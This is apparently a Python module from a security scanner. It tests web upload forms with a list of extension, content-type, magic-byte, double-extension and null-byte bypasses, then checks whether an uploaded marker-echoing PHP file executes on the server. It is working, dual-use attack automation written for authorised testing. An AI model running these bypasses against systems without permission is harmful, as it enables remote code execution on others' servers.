"""File-upload bypass tester.

For a discovered multipart upload form, rotate extension / content-type /
magic-byte / double-extension / null-byte bypass variations, upload a benign
proof file carrying a unique marker, then locate the stored file and fetch it:

 - server EXECUTES it (marker returned WITHOUT the <?php wrapper)  -> RCE via
   unrestricted file upload (critical)
 - file retrievable but inert (marker returned WITH the wrapper)   -> unrestricted
   / dangerous file upload (medium)

Non-destructive: the uploaded PHP only `echo`es a unique marker — no commands, no
shell. Authorised targets only. Confirmed deterministically; one variation is
enough. Disable with VAPT_UPLOAD=0.
"""
import re
import uuid
from urllib.parse import urljoin, urlparse


def _mark():
    return "vaptup" + uuid.uuid4().hex[:10]


def _php_proof(mark):
    # benign proof-of-execution: echoes the marker, runs nothing else
    return f"<?php echo '{mark}'; ?>".encode()


# (label, filename-template, content-type, content-prefix)
_VARIATIONS = [
    ("plain .php", "{n}.php", "application/x-php", b""),
    (".php + image/jpeg content-type", "{n}.php", "image/jpeg", b""),
    (".phtml", "{n}.phtml", "application/octet-stream", b""),
    (".php5", "{n}.php5", "application/octet-stream", b""),
    (".php3", "{n}.php3", "application/octet-stream", b""),
    (".phar", "{n}.phar", "application/octet-stream", b""),
    (".pht", "{n}.pht", "application/octet-stream", b""),
    ("double extension .php.jpg", "{n}.php.jpg", "image/jpeg", b""),
    ("double extension .jpg.php", "{n}.jpg.php", "image/jpeg", b""),
    ("uppercase .PHP", "{n}.PHP", "image/jpeg", b""),
    ("null-byte .php%00.jpg", "{n}.php\x00.jpg", "image/jpeg", b""),
    ("GIF89a magic + .php (content-sniff bypass)", "{n}.php", "image/gif", b"GIF89a;\n"),
    ("trailing-dot .php.", "{n}.php.", "image/jpeg", b""),
]

# where servers commonly store uploads, relative to the form action's directory
_GUESS_DIRS = ["", "uploads/", "../uploads/", "files/", "../files/", "upload/",
               "../../hackable/uploads/", "images/", "media/", "../"]


def _multipart(fields, file_field, filename, content, ctype):
    """Build a multipart/form-data body + Content-Type header (with boundary)."""
    # plain hex boundary (no leading dashes — some multipart parsers, incl. PHP,
    # mis-handle a boundary value that itself begins with dashes)
    boundary = "vaptbench" + uuid.uuid4().hex
    buf = b""
    for k, v in (fields or {}).items():
        buf += (f'--{boundary}\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n'
                f'{v}\r\n').encode()
    buf += (f'--{boundary}\r\nContent-Disposition: form-data; name="{file_field}"; '
            f'filename="{filename}"\r\nContent-Type: {ctype}\r\n\r\n').encode()
    buf += content + f"\r\n--{boundary}--\r\n".encode()
    return f"Content-Type: multipart/form-data; boundary={boundary}", buf


def _candidate_urls(resp_text, action, filename):
    """Candidate URLs for the stored file: paths named in the response first,
    then common upload directories relative to the action."""
    stem = filename.split("\x00")[0].split("/")[-1]
    cands = []
    # 1) any path token in the response that mentions our file stem
    base_stem = re.escape(stem.split(".")[0])
    for m in re.findall(r"[\w./\\-]*" + base_stem + r"[\w./\\-]*", resp_text or ""):
        p = m.replace("\\", "/").strip()
        if p:
            cands.append(urljoin(action, p))
    # 2) common upload dirs relative to the action directory
    adir = action.rsplit("/", 1)[0] + "/"
    effective = stem.split("\x00")[0]
    for d in _GUESS_DIRS:
        cands.append(urljoin(adir, d + effective))
        if effective != stem:
            cands.append(urljoin(adir, d + stem))
    # de-dupe, keep in-order, same host only
    host = urlparse(action).hostname
    seen, out = set(), []
    for u in cands:
        u = u.split("#")[0]
        if u not in seen and urlparse(u).hostname == host and u.startswith("http"):
            seen.add(u)
            out.append(u)
    return out[:20]


def _finding(form, label, filename, url, executed, evidence):
    if executed:
        return dict(
            title=f"Remote code execution via unrestricted file upload ({label})",
            vuln_class="hunt-file-upload", severity="critical", confidence="confirmed",
            cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            description=f"The upload form at {form['action']} accepts a server-executable file using "
                        f"the bypass **{label}**. The uploaded PHP was stored at {url} and the server "
                        f"EXECUTED it (our unique marker was returned without the <?php wrapper) — "
                        f"proving arbitrary code execution. The proof file only echoes a marker; no "
                        f"commands were run.",
            steps=f"Upload '{filename}' to {form['action']} (variation: {label}); fetch {url}.",
            poc_request=f"POST {form['action']} (multipart; filename={filename})",
            poc_response=evidence)
    return dict(
        title=f"Unrestricted / dangerous file upload ({label})",
        vuln_class="hunt-file-upload", severity="medium", confidence="confirmed",
        cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
        description=f"The upload form at {form['action']} stored a server-side script file using the "
                    f"bypass **{label}** and served it back from {url}. It was not executed here, but "
                    f"storing attacker-controlled script/HTML under the web root is dangerous "
                    f"(stored XSS, or RCE on a differently-configured handler).",
        steps=f"Upload '{filename}' to {form['action']} (variation: {label}); fetch {url}.",
        poc_request=f"POST {form['action']} (multipart; filename={filename})",
        poc_response=evidence)


def check_upload(send, form, log=None):
    """Try upload bypass variations against one form. `send` matches the engine
    contract: send(method, url, headers="", body=b"") -> dict(ok, text, status).
    Returns a finding dict on the first confirmed variation, else None."""
    file_field = form.get("file_field") or "file"
    action = form["action"]
    # non-file inputs (e.g. DVWA's Upload=Upload submit button) ride along
    fields = {k: v for k, v in (form.get("inputs") or {}).items()}
    for label, fn_tmpl, ctype, prefix in _VARIATIONS:
        mark = _mark()
        filename = fn_tmpl.format(n=mark)
        content = prefix + _php_proof(mark)
        header, body = _multipart(fields, file_field, filename, content, ctype)
        r = send("POST", action, headers=header, body=body)
        if not r.get("ok"):
            continue
        resp_text = r.get("text") or ""
        for url in _candidate_urls(resp_text, action, filename):
            g = send("GET", url)
            if not g.get("ok") or g.get("status") != 200:
                continue
            got = g.get("text") or ""
            if mark in got:
                executed = "<?php" not in got and "echo" not in got
                if log:
                    log("hit", "upload",
                        f"★ upload bypass '{label}' -> {'EXECUTED (RCE)' if executed else 'stored'} at {url}")
                return _finding(form, label, filename, url, executed,
                                (f"GET {url}\nHTTP {g.get('status')}\n\n" + got[:400]))
    return None
